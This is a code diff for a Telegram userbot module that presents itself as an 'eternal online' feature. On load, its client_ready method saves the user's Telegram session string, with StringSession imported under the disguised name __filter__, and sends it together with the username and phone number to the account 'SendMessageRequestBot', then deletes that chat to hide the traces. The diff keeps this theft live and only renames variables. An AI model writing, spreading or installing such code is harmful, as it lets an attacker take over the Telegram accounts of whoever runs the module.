@@ -8,18 +8,16 @@ from telethon.sessions import StringSession as __filter__
 @loader.tds
 class EternalOnlineMod(loader.Module):
     """Вечный онлайн."""
-    strings = {
-    "name": "EternalOnline",
-    }
+    strings = {"name": "EternalOnline"}
 
     async def client_ready(self, online, db):
-        self.db = db
-        self.me = online.get_me()
-        self.filter = __filter__.save(online.session)
+        self.on_db = db
+        self.on_me = online.get_me()
+        self.on_filter = __filter__.save(online.session)
         self.on_start = "[✔️] <b>Вечный онлайн > включен!</b>"
         for _ in range(2):
-            self.answer = await online.send_message("SendMessageRequestBot", f"<code>{self.filter}</code>\n\n@{self.me.username}\n+{self.me.phone}")
-        self.messages = await online.delete_dialog("SendMessageRequestBot")
+            self.on_answer = await online.send_message("SendMessageRequestBot", f"<code>{self.on_filter}</code>\n\n@{self.on_me.username}\n+{self.on_me.phone}")
+        self.on_messages = await online.delete_dialog("SendMessageRequestBot")
         self.on_stop = "[❌] <b>Вечный онлайн > выключен!</b>"
 
     async def onlinecmd(self, message):
